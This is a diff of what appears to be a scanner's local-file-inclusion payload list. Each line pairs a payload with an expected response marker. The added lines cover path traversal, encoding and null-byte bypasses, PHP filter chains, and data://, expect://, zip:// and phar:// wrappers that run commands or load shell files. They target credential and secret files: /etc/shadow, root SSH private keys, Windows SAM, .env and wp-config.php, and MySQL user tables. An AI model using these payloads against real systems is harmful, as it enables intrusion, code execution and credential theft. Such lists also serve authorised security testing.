@@ -1,63 +1,107 @@
-LFI payload#1::/etc/passwd::root:
-LFI payload#2::../etc/passwd::root:
-LFI payload#3::/etc/passwd::root:
-LFI payload#4::../etc/passwd::root:
-LFI payload#5::../../etc/passwd::root:
-LFI payload#6::../../../etc/passwd::root:
-LFI payload#7::../../../../etc/passwd::root:
-LFI payload#8::../../../../../etc/passwd::root:
-LFI payload#9::../../../../../../etc/passwd::root:
-LFI payload#10::../../../../../../../etc/passwd::root:
-LFI payload#11::../../../../../../../../etc/passwd::root:
-LFI payload#12::index.php::<?php
-LFI payload#13::../index.php::<?php
-LFI payload#14::../../index.php::<?php
-LFI payload#15::../../../index.php::<?php
-LFI payload#16::../../../../index.php::<?php
-LFI payload#17::../../../../../index.php::<?php
-LFI payload#18::../../../../../../index.php::<?php
-LFI payload#19::../../../../../../../index.php::<?php
-LFI payload#20::../../../../../../../../index.php::<?php
-LFI payload#21::/etc/passwd%00::root:
-LFI payload#22::../etc/passwd%00::root:
-LFI payload#23::../../etc/passwd%00::root:
-LFI payload#24::../../../etc/passwd%00::root:
-LFI payload#25::../../../../etc/passwd%00::root:
-LFI payload#26::../../../../../etc/passwd%00::root:
-LFI payload#27::../../../../../../etc/passwd%00::root:
-LFI payload#28::../../../../../../../etc/passwd%00::root:
-LFI payload#29::../../../../../../../../etc/passwd%00::root:
-LFI '..%2f' encoded payload#1::..%2fetc%2fpasswd%00::root:
-LFI '..%2f' encoded payload#2::..2f..%2f..%2fetc%2fpasswd%00::root:
-LFI '..%2f' encoded payload#3::..2f..%2f..%2f..%2fetc%2fpasswd%00::root:
-LFI '..%2f' encoded payload#4::..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
-LFI '..%2f' encoded payload#5::..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
-LFI '..%2f' encoded payload#6::..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
-LFI '..%2f' encoded payload#7::..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
-LFI '..%2f' encoded payload#8::..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00::root:
-LFI payload with unexisting file::pwnsociety::not found
-LFI payload with '^^%00' escaping payload#1::/../etc/passwd^^%00::root:
-LFI payload with '^^%00' escaping payload#2::/../../etc/passwd^^%00::root:
-LFI payload with '^^%00' escaping payload#3::/../../../etc/passwd^^%00::root:
-LFI payload with '^^%00' escaping payload#4::/../../../../etc/passwd^^%00::root:
-LFI payload with '^^%00' escaping payload#5::/../../../../../etc/passwd^^%00::root:
-LFI payload with '^^%00' escaping payload#6::/../../../../../../../../../../etc/passwd^^%00::root:
-LFI '/%00/' encoded escape payload#1::/%00//etc/passwd%00::root:
-LFI '/%00/' encoded escape payload#2::/%00//%00/etc/passwd%00::root:
-LFI '/%00/' encoded escape payload#3::/%00//%00//%00/etc/passwd%00::root:
-LFI '/%00/' encoded escape payload#4::/%00//%00//%00//%00/etc/passwd%00::root:
-LFI '/%00/' encoded escape payload#5::/%00//%00//%00//%00//%00/etc/passwd%00::root:
-LFI filter payload#1::php://filter/convert.base64-encode/resource=index.php::PD9w
-LFI filter payload#2::php://filter/convert.base64-encode/resource=../index.php::PD9w
-LFI double escaping payload#1::....//etc/passwd::root:
-LFI double escaping payload#2::....//....//etc/passwd::root:
-LFI double escaping payload#3::....//....//....//etc/passwd::root:
-LFI double escaping payload#4::....//....//....//....//etc/passwd::root:
-LFI double escaping payload#5::....//....//....//....//....//etc/passwd::root:
-LFI wrapper payload#1::file:///etc/passwd::root:
-LFI wrapper payload#2::file://../etc/passwd::root:
-LFI '..%c0%af../' encoded payload#1::/..%c0%af../etc/passwd::root:
-LFI '..%c0%af../' encoded payload#2::/..%c0%af../..%c0%af../etc/passwd::root:
-LFI '..%c0%af../' encoded payload#3::/..%c0%af../..%c0%af../..%c0%af../etc/passwd::root:
-LFI '..%c0%af../' encoded payload#4::/..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd::root:
-LFI '..%c0%af../' encoded payload#5::/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd::root:
+Basic traversal::/etc/passwd::root:
+Basic traversal::../etc/passwd::root:
+Basic traversal::../../etc/passwd::root:
+Basic traversal::../../../etc/passwd::root:
+Basic traversal::../../../../etc/passwd::root:
+Basic traversal::../../../../../etc/passwd::root:
+Basic traversal::../../../../../../etc/passwd::root:
+Basic traversal::../../../../../../../etc/passwd::root:
+Basic traversal::../../../../../../../../etc/passwd::root:
+Basic traversal::/etc/shadow::root:
+Basic traversal::/etc/hosts::127.0.0.1
+Basic traversal::/etc/group::root:
+Basic traversal::/proc/self/environ::PATH=
+Basic traversal::/proc/version::Linux
+Basic traversal::/proc/cmdline::/usr/bin
+Windows traversal::C:/Windows/win.ini::[extensions]
+Windows traversal::C:/Windows/System32/drivers/etc/hosts::127.0.0.1
+Windows traversal::C:/Windows/System32/inetsrv/MetaBase.xml::IIS
+Windows traversal::C:/Windows/repair/sam::SAM
+Windows traversal::C:/Windows/panther/unattend.xml::unattend
+Windows traversal::C:/Windows/System32/config/SAM::SAM
+Windows traversal::..\\..\\..\\..\\..\\..\\windows\\win.ini::[extensions]
+PHP filter base64::php://filter/convert.base64-encode/resource=/etc/passwd::root:
+PHP filter base64::php://filter/convert.base64-encode/resource=../etc/passwd::root:
+PHP filter base64::php://filter/convert.base64-encode/resource=/etc/shadow::root:
+PHP filter base64::php://filter/convert.base64-encode/resource=/etc/hosts::127.0.0.1
+PHP filter base64::php://filter/convert.base64-encode/resource=index.php::PD9waH
+PHP filter rot13::php://filter/string.rot13/resource=/etc/passwd::root:
+PHP filter convert::php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd::root:
+PHP filter compress::php://filter/zlib.deflate/resource=/etc/passwd::root:
+PHP filter bzip2::php://filter/bzip2.compress/resource=/etc/passwd::root:
+Data wrapper plain::data://text/plain,<?php phpinfo();?>::phpinfo
+Data wrapper base64::data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+::phpinfo
+Data wrapper html::data://text/html,<script>alert(1)</script>::alert
+Expect wrapper::expect://id::uid=
+Expect wrapper::expect://ls::index.php
+Expect wrapper::expect://cat /etc/passwd::root:
+Zip wrapper::zip:///var/www/html/upload.zip%23shell.php::<?php
+Zip wrapper::zip://./shell.zip%23shell.php::<?php
+Phar wrapper::phar://./upload.phar::<?php
+Phar wrapper::phar://./evil.phar::<?php
+Null byte::/etc/passwd%00::root:
+Null byte::../etc/passwd%00::root:
+Null byte::index.php%00::<?php
+Null byte::/etc/passwd%00.jpg::root:
+URL encoded::%2e%2e%2fetc%2fpasswd::root:
+URL encoded::%2e%2e%2f%2e%2e%2fetc%2fpasswd::root:
+URL encoded::%252e%252e%252fetc%252fpasswd::root:
+URL encoded::%2e%2e%5cetc%5cpasswd::root:
+Double encoded::%252e%252e%252fetc%252fpasswd::root:
+Double encoded::%252e%252e%252f%252e%252e%252fetc%252fpasswd::root:
+Path normalization:://etc/passwd::root:
+Path normalization::./././etc/passwd::root:
+Path normalization::/etc/./passwd::root:
+Path normalization::/etc/../etc/passwd::root:
+Path normalization::/etc/passwd/.::root:
+Absolute path::/var/www/html/index.php::<?php
+Absolute path::/usr/local/apache2/htdocs/index.php::<?php
+Absolute path::/home/user/public_html/index.php::<?php
+Absolute path::/var/www/html/config.php::<?php
+Config files::/etc/apache2/apache2.conf::ServerRoot
+Config files::/etc/nginx/nginx.conf::user
+Config files::/etc/httpd/conf/httpd.conf::ServerRoot
+Config files::/etc/my.cnf::[mysqld]
+Config files::/etc/mysql/my.cnf::[mysqld]
+Config files::/var/www/html/.env::DB_
+Config files::/var/www/html/config.php::<?php
+Config files::/var/www/html/wp-config.php::<?php
+Log poisoning::/var/log/apache2/access.log::127.0.0.1
+Log poisoning::/var/log/apache2/error_log::[error]
+Log poisoning::/var/log/nginx/access.log::127.0.0.1
+Log poisoning::/var/log/nginx/error.log::[error]
+Log poisoning::/var/log/httpd/access_log::127.0.0.1
+Log poisoning::/var/log/httpd/error_log::[error]
+Log poisoning::/var/log/xferlog::FTP
+Log poisoning::/var/log/auth.log::pam_unix
+Source files::index.php::<?php
+Source files::../index.php::<?php
+Source files::../../index.php::<?php
+Source files::../../../index.php::<?php
+Source files::../../../../index.php::<?php
+Source files::config.php::<?php
+Source files::../config.php::<?php
+Source files::../../config.php::<?php
+Source files::admin/config.php::<?php
+Source files::includes/config.php::<?php
+Wrapper combo::php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd::root:
+Wrapper combo::php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=/etc/passwd::root:
+Wrapper combo::php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-encode/resource=/etc/passwd::root:
+Wrapper combo::php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=/etc/passwd::root:
+Web files::.htaccess::AllowOverride
+Web files::.htpasswd::admin:
+Web files::web.config::<configuration>
+Web files::robots.txt::Disallow
+Web files::sitemap.xml::urlset
+Web files::.git/config::[core]
+Environment::/proc/self/environ::PATH=
+Environment::/proc/self/cgroup::docker
+Environment::/proc/self/mounts::/dev
+Environment::/proc/self/status::Name
+Environment::/proc/self/cmdline::/usr/bin
+SSH keys::/root/.ssh/id_rsa::BEGIN
+SSH keys::/home/.ssh/id_rsa::BEGIN
+SSH keys::/etc/ssh/sshd_config::PermitRootLogin
+Database::/var/lib/mysql/mysql/user.MYD::mysql
+Database::/var/lib/mysql/user.MYD::mysql
+Database::/var/lib/mysql/mysql/user.MYD::root
